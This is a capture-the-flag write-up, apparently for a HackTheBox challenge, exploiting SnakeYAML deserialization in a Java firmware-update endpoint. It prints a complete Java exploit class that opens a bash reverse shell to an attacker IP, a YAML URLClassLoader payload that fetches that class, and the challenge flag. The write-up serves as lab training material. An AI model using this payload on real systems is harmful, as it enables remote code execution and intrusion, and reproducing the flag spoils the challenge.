### Challenge description

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

This page greets us with some IOT looking stuff. Something about water levels in some tanks:

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

It gives us the option to do a Firmware Update based on user inputted configuration. Uh oh!

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Looking through the source code, specifically the `pom.xml` file where all the dependencies are for Java based web applications, we find it is using `snakeyaml`:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

There are some well-known exploits for yaml deserialization, including for snakeyaml. A good resource that I used can be found here: https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858

I tested the payload from the blog trying to get a callback to myself:
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Even though it says that "an error occured", we do get a callback:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

In this case all we need is to setup our files in the correct folders and with the correct names.

#### Step 1: Create exploit.java with a reverse shell payload:

```java
package snakeyaml;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class exploit implements ScriptEngineFactory {

    public exploit() {
        try {
            Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/10.10.14.76/1338 0>&1");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```
#### Step 2. Compile `exploit.java` and put the resulted `exploit.class` file in a folder called `snakeyaml`. This is done automatically with the syntax below because I specify the package in the code above.

```bash
javac -d . exploit.java
```

#### Step 3: Create folder `META-INF` and inside it another folder called `services`. Create a file called `javax.script.ScriptEngineFactory` with the content being: `snakeyaml.exploit`

#### Step 4: Host these on port 80 or whatever port you will mention in your yaml payload on the "Firmware Update".
#### Step 5: Send the payload below in the `/update` endpoint:

```xml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.76/"]
  ]]
]
```
Once we do that, we can see we get a callback on our netcat listener and can read the flag.
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

HTB{r1d3_th3_sn4k3}

